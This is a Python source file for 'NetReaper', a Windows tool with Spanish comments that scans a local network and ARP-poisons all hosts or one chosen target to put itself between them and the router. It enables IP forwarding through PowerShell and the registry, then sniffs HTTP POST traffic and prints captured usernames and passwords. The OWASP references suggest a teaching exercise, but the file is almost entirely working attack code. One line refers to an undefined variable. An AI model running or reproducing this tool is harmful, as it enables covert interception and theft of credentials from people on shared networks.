#VIPREDSniffer

from scapy.all import sniff, IP, TCP, Raw, IFACES, ARP, Ether, sendp, srp, get_if_hwaddr
from urllib.parse import unquote_plus
import re
import socket
import subprocess
import threading
import time
import ipaddress
import sys
from scapy.all import sniff, IP, TCP, Raw, IFACES, ARP, Ether, sendp, srp, get_if_hwaddr, conf

# Palabras clave comunes en formularios de login
KEYWORDS = ["username", "user", "email", "login",
            "password", "passwd", "pass", "pwd", "token"]

CAMPOS_USUARIO = ["user", "username", "user_login", "email", "login", "uname", "usr"]
CAMPOS_PASS    = ["password", "pass", "passwd", "pwd", "user_password", "passw"]

# Set para evitar imprimir capturas duplicadas (por retransmisiones TCP)
paquetes_procesados = set()

def procesar_paquete(paquete):
    global paquetes_procesados
    
    # Solo nos interesan los paquetes de datos (TCP) que contengan texto (Raw)
    if not (paquete.haslayer(TCP) and paquete.haslayer(Raw)):
        return

    # #VIPREDSniffer 1 - Filtro Inseguro (OWASP A04)
    # Filtramos para analizar solo el tráfico web (Puerto 80 = HTTP)
    # OWASP A02:2021 (Cryptographic Failures) advierte contra el uso de protocolos sin cifrar como HTTP.
    tcp = paquete[TCP]
    if tcp.dport != 80 and tcp.sport != 80:
        return

    try:
        payload = paquete[Raw].load.decode("utf-8", errors="ignore")
    except Exception:
        return

    if "POST" not in payload:
        return

    payload_lower = payload.lower()
    if not any(kw in payload_lower for kw in KEYWORDS):
        return

    src_ip = paquete[IP].src if paquete.haslayer(IP) else "?"
    dst_ip = paquete[IP].dst if paquete.haslayer(IP) else "?"

    # Extraer host del header HTTP
    host = "desconocido"
    host_match = re.search(r"Host:\s*(.+?)\r\n", payload)
    if host_match:
        host = host_match.group(1).strip()

    # Extraer body del POST
    body = ""
    if "\r\n\r\n" in payload:
        body = payload.split("\r\n\r\n", 1)[1]
    elif "\n\n" in payload:
        body = payload.split("\n\n", 1)[1]

    # Parsear campos clave=valor del body
    campos = {}
    for par in body.split("&"):
        if "=" in par:
            clave, _, valor = par.partition("=")
            campos[unquote_plus(clave).lower()] = unquote_plus(valor)

    # Identificar usuario y password
    usuario  = next((campos[c] for c in CAMPOS_USUARIO if c in campos), None)
    password = next((campos[c] for c in CAMPOS_PASS    if c in campos), None)

    # Crear una "firma" de la petición para evitar duplicados
    firma = f"{src_ip}-{dst_ip}-{host}-{body}"
    if firma in paquetes_procesados:
        return
    paquetes_procesados.add(firma)

    # Limpiar el historial cada cierto tiempo para no llenar la RAM (si hay muchas)
    if len(paquetes_procesados) > 500:
        paquetes_procesados.clear()

    sep = "=" * 60
    print(f"\n{sep}")
    print(f"  [!] CREDENCIALES CAPTURADAS")
    print(f"{sep}")
    print(f"  Sitio     : {host}")
    print(f"  Origen    : {src_ip}  ->  {dst_ip}")
    if usuario:
        print(f"  Usuario   : {usuario}")
    if password:
        print(f"  Password  : {password}")
    if not usuario and not password:
        print(f"  Datos     : {body[:300]}")
    print(f"{sep}")


def detectar_interfaz():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        mi_ip = s.getsockname()[0]
        s.close()
    except Exception:
        print("[!] No se pudo determinar la IP local.")
        return None, None, None

    for k, v in IFACES.items():
        try:
            if hasattr(v, 'ip') and v.ip == mi_ip:
                nombre = getattr(v, 'name', k)
                return k, nombre, mi_ip
        except Exception:
            continue
    return None, None, mi_ip


def forzar_descubrimiento(rango):
    # #VIPREDSniffer 3 - El Olfateador Activo (Descubrimiento previo)
    try:
        red = ipaddress.IPv4Network(rango)
    except:
        return
        
    print(f"[*] Forzando descubrimiento de red en {rango} ({len(list(red.hosts()))} hosts)...")
    
    def hacer_ping(ip):
        try:
            subprocess.call(["ping", "-n", "1", "-w", "200", ip], 
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL,
                            creationflags=0x08000000)
        except: pass

    hilos = []
    hosts = list(red.hosts())
    if len(hosts) > 1024:
        print("[!] Red grande, limitando escaneo inicial a 1024 IPs.")
        hosts = hosts[:1024]

    for host in hosts:
        t = threading.Thread(target=hacer_ping, args=(str(host),))
        t.start()
        hilos.append(t)
        if len(hilos) > 100:
            for h in hilos: h.join()
            hilos = []
    for h in hilos: h.join()
    
    time.sleep(3.5)
    print("[*] Descubrimiento completado.")


def activar_ip_forwarding():
    # #VIPREDSniffer 2 - Invisibilidad (Hombre en el Medio)
    # El IP Forwarding convierte a la computadora en un "Router" temporal.
    # Es fundamental para un ataque Man-in-the-Middle (MitM) invisible; 
    # sin esto, el tráfico se bloquea (Denegación de Servicio).
    print("[*] Activando IP Forwarding (Reenvío de IP) en Windows...")
    try:
        # Intenta usar PowerShell
        subprocess.call(
            ["powershell", "-Command", "Set-NetIPInterface -Forwarding Enabled"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000
        )
        # Respaldo: Cambiar la clave del registro
        subprocess.call(
            ["reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", 
             "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000
        )
    except Exception:
        pass


def detectar_red_completa(mi_ip, interfaz):
    gateway = None
    try:
        resultado = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
        for linea in resultado.splitlines():
            if ("Puerta de enlace" in linea or "Default Gateway" in linea) and ":" in linea:
                gw = linea.split(":")[-1].strip()
                if gw and "." in gw:
                    gateway = gw
                    break
    except Exception:
        pass

    if not gateway:
        partes = mi_ip.split(".")
        gateway = f"{partes[0]}.{partes[1]}.{partes[2]}.1"

    mascara = "255.255.255.0"
    for iface_name in conf.ifaces:
        iface = conf.ifaces[iface_name]
        if getattr(iface, 'ip', None) == mi_ip:
            mascara = getattr(iface, 'netmask', "255.255.255.0")
            break

    try:
        rango = str(ipaddress.IPv4Interface(f"{mi_ip}/{mascara}").network)
    except:
        partes = mi_ip.split(".")
        rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
        
    return gateway, rango


def leer_arp_windows(mi_ip, gateway):
    try:
        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
        dispositivos = []
        en_interfaz_correcta = False
        
        for linea in resultado.splitlines():
            if mi_ip in linea and "Interfaz:" in linea:
                en_interfaz_correcta = True
                continue
            
            if "Interfaz:" in linea and mi_ip not in linea:
                en_interfaz_correcta = False
            
            if not en_interfaz_correcta:
                continue
            
            partes = linea.split()
            if len(partes) >= 2:
                ip = partes[0]
                mac = partes[1].replace("-", ":")
                
                if (ip not in (gateway, mi_ip) 
                    and not ip.startswith("224.") 
                    and not ip.startswith("239.")
                    and not ip.endswith(".255") 
                    and "dinámico" in linea.lower()
                    and mac != "ff:ff:ff:ff:ff:ff"):
                    dispositivos.append({"ip": ip, "mac": mac})
        return dispositivos
    except Exception:
        return []


def obtener_mac(ip, interfaz):
    for _ in range(3):
        paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        resp, _ = srp(paquete, iface=interfaz, timeout=5, verbose=False)
        if resp:
            return resp[0][1].hwsrc
        time.sleep(0.5)
    try:
        resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
        for linea in resultado.splitlines():
            if ip in linea and "dinámico" in linea.lower():
                partes = linea.split()
                if len(partes) >= 2 and partes[0] == ip:
                    return partes[1].replace("-", ":")
    except Exception:
        pass
    return None


def escanear_red(rango, interfaz, mi_ip, gateway):
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
    respondidos, _ = srp(paquete, iface=interfaz, timeout=4, verbose=False)

    dispositivos = []
    ips_encontradas = set()
    
    for _, resp in respondidos:
        ip  = resp[ARP].psrc
        mac = resp[ARP].hwsrc
        if ip in (gateway, mi_ip): continue
        dispositivos.append({"ip": ip, "mac": mac})
        ips_encontradas.add(ip)

    dispositivos_windows = leer_arp_windows(mi_ip, gateway)
    for dw in dispositivos_windows:
        if dw["ip"] not in ips_encontradas:
            dispositivos.append(dw)
            ips_encontradas.add(dw["ip"])

    return dispositivos


def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
    # VULNERABILIDAD CAPA 2 (Enlace de Datos): Envenenamiento ARP (ARP Spoofing)
    # Crea un paquete ARP falso diciendo: "La IP suplantada (Router) ahora tiene mi dirección MAC".
    # Como el protocolo ARP no tiene autenticación, las víctimas lo aceptan ciegamente.
    paquete = Ether(dst=mac_objetivo) / ARP(
        op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
        psrc=ip_suplantada, hwsrc=mi_mac
    )
    sendp(paquete, iface=interfaz, verbose=False)


def restaurar(dispositivos, gateway, mac_gateway, interfaz):
    print("\n[*] Restaurando tablas ARP y apagando sniffer...")
    for d in dispositivos:
        p1 = Ether(dst=d["mac"]) / ARP(
            op=2, pdst=d["ip"], hwdst=d["mac"],
            psrc=gateway, hwsrc=mac_gateway
        )
        p2 = Ether(dst=mac_gateway) / ARP(
            op=2, pdst=gateway, hwdst=mac_gateway,
            psrc=d["ip"], hwsrc=d["mac"]
        )
        sendp([p1, p2], iface=interfaz, count=5, verbose=False)


def hilo_interceptar_red(interfaz, mi_ip, gateway, rango, objetivo_ip=""):
    # Este hilo se ejecuta en segundo plano. Mantiene a las víctimas engañadas.
    mi_mac = get_if_hwaddr(interfaz)
    print(f"[*] Preparando intercepción invisible (ARP Spoofing)...")
    mac_gateway = obtener_mac(gateway, interfaz)
    
    if not mac_gateway:
        print("[!] Fallo crítico: No se encontró el gateway.")
        return

    dispositivos_encontrados = escanear_red(rango, interfaz, mi_ip, gateway)
    
    if objetivo_ip:
        dispositivos = [d for d in dispositivos_encontrados if d["ip"] == objetivo_ip]
        if not dispositivos:
            mac_obj = obtener_mac(objetivo_ip, interfaz)
            if mac_obj:
                dispositivos = [{"ip": objetivo_ip, "mac": mac_obj}]
            else:
                print(f"[!] No se encontró la IP {objetivo_ip}. Intercepción abortada.")
                return
    else:
        dispositivos = dispositivos_encontrados

    if not dispositivos:
        print("[!] No hay dispositivos para interceptar.")
        return

    print(f"[*] Interceptando tráfico de {len(dispositivos)} dispositivos silenciosamente.")
    
    ciclos = 0
    try:
        while True:
            if not objetivo_ip and ciclos % 30 == 0 and ciclos != 0:
                nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
                ips_actuales = {d["ip"] for d in dispositivos}
                for d in nuevos:
                    if d["ip"] not in ips_actuales:
                        dispositivos.append(d)
                        print(f"\n    [+] Nuevo dispositivo interceptado: {d['ip']}")

            for d in dispositivos:
                spoof(d["ip"],  d["mac"],   gateway, mi_mac, interfaz)
                spoof(gateway, mac_gateway, d["ip"], mi_mac, interfaz)

            ciclos += 1
            time.sleep(1.5)
    except Exception:
        restaurar(dispositivos, gateway, mac_gateway, interfaz)


def main():
    print("=" * 55)
    print("       NETREAPER SNIFFER — MODO TOTALMENTE AUTOMATICO")
    # 1. Detectar IP e interfaz
    INTERFAZ, IFACE_NAME, mi_ip = detectar_interfaz()
    if not INTERFAZ:
        print("[!] No se pudo encontrar una interfaz activa.")
        return
    
    print(f"[+] Interfaz Activa: {IFACE_NAME}")
    print(f"[+] Tu IP Local    : {mi_ip}")

    # 2. Descubrir la red
    gateway, rango = detectar_red_completa(mi_ip, INTERFAZ)
    print(f"[+] Gateway (Router): {gateway}")
    print(f"[+] Rango de Red   : {rango}")

    # Forzar descubrimiento previo
    forzar_descubrimiento(rango)
    
    print("\n" + "="*55)
    print(" [?] MODO DE INTERCEPCIÓN")
    print("     Presiona ENTER para escuchar a TODA LA RED.")
    print("     O escribe una IP específica (Ej: 192.168.1.15) para un ataque dirigido.")
    print("="*55)
    objetivo_ip = input("\n[>] Tu elección: ").strip()

    # 3. Lanzar el interceptor ARP (Ataque Man-in-the-Middle) en un hilo paralelo
    t_interceptor = threading.Thread(
        target=hilo_interceptar_red, 
        args=(INTERFAZ, mi_ip, gateway, rango, objetivo_ip)
    )
    t_interceptor.daemon = True
    t_interceptor.start()

    # Dar unos segundos para que el interceptor empiece
    time.sleep(5)

    print(f"\n[*] Todo listo. Escuchando en {nombre} — puerto 80 (HTTP)")
    print("[*] Esperando pacientemente credenciales...\n")

    try:
        # #VIPREDSniffer 3 - El Olfateador Activo
        # La función sniff de Scapy "olfatea" (captura) todo el tráfico que pasa por la tarjeta de red.
        sniff(
            iface=INTERFAZ,
            filter="tcp port 80",
            prn=procesar_paquete, # Por cada paquete capturado, ejecuta procesar_paquete()
            store=False
        )
    except KeyboardInterrupt:
        print("\n[*] Saliendo de NetReaper...")


if __name__ == "__main__":
    main()